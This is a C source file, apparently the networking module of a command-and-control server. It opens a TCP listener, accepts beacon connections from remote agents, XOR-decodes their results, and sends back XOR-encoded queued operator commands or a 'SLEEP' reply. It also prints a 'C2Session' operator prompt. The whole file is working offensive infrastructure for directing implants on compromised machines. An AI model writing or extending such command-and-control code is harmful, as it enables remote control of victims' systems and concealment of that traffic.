#include "Network.h"
#include "Cipher.h"
#include <stdio.h>
#include <string.h>

#ifdef _WIN32
  #include <winsock2.h>
#else
  #include <fcntl.h>
  #include <netinet/in.h>
#endif

int NetInit(void)
{
#ifdef _WIN32
    WSADATA Wsa;
    if (WSAStartup(MAKEWORD(2, 2), &Wsa) != 0) {
        fprintf(stderr, "[!] WSAStartup failed.\n");
        return 0;
    }
#endif
    return 1;
}

void NetCleanup(void)
{
#ifdef _WIN32
    WSACleanup();
#endif
}

NetSocket NetCreateListener(const char *BindAddr, int Port)
{
    NetSocket Sock = socket(AF_INET, SOCK_STREAM, 0);
    if (Sock == NetInvalid) {
        fprintf(stderr, "[!] Failed to create socket.\n");
        return NetInvalid;
    }

    int Reuse = 1;
    setsockopt(Sock, SOL_SOCKET, SO_REUSEADDR, (const char *)&Reuse, sizeof(Reuse));

    struct sockaddr_in Addr;
    memset(&Addr, 0, sizeof(Addr));
    Addr.sin_family      = AF_INET;
    Addr.sin_addr.s_addr = inet_addr(BindAddr);
    Addr.sin_port        = htons((unsigned short)Port);

    if (bind(Sock, (struct sockaddr *)&Addr, sizeof(Addr)) < 0) {
        fprintf(stderr, "[!] Bind failed on %s:%d\n", BindAddr, Port);
        NetClose(Sock);
        return NetInvalid;
    }

    if (listen(Sock, 8) < 0) {
        fprintf(stderr, "[!] Listen failed.\n");
        NetClose(Sock);
        return NetInvalid;
    }

    return Sock;
}

void NetSetNonBlocking(NetSocket Sock)
{
#ifdef _WIN32
    unsigned long Flag = 1;
    ioctlsocket(Sock, FIONBIO, &Flag);
#else
    fcntl(Sock, F_SETFL, fcntl(Sock, F_GETFL, 0) | O_NONBLOCK);
#endif
}

int NetHandleBeacon(NetSocket Listener, AgentSession *Session)
{
    struct sockaddr_in AgentAddr;
    socklen_t          AddrSize = sizeof(AgentAddr);

    NetSocket AgentSock = accept(Listener, (struct sockaddr *)&AgentAddr, &AddrSize);
    if (AgentSock == NetInvalid)
        return 0;

    char Buf[BufferSize] = {0};
    int  Received        = recv(AgentSock, Buf, BufferSize - 1, 0);

    if (Received <= 0) {
        NetClose(AgentSock);
        return 1;
    }

    Buf[Received] = '\0';
    ApplyXor(Buf, (size_t)Received);
    memcpy(Session->LastResult, Buf, (size_t)Received);
    Session->LastResult[Received] = '\0';

    SessionRegister(Session, inet_ntoa(AgentAddr.sin_addr));

    if (Session->CommandPending && strlen(Session->PendingCommand) > 0) {
        size_t CmdLen = strlen(Session->PendingCommand);
        ApplyXor(Session->PendingCommand, CmdLen);
        send(AgentSock, Session->PendingCommand, (int)CmdLen, 0);
        memset(Session->PendingCommand, 0, BufferSize);
        Session->CommandPending = 0;
        Session->WaitingResult  = 1;
    } else {
        char Sleep[] = "SLEEP";
        size_t SleepLen = strlen(Sleep);
        ApplyXor(Sleep, SleepLen);
        send(AgentSock, Sleep, (int)SleepLen, 0);
    }

    if (Session->InSession && Session->WaitingResult) {
        printf("\n[AgentResponse]\n%s\n", Session->LastResult);
        printf("C2Session[%s]> ", Session->Address);
        fflush(stdout);
        Session->WaitingResult = 0;
    }

    NetClose(AgentSock);
    return 1;
}
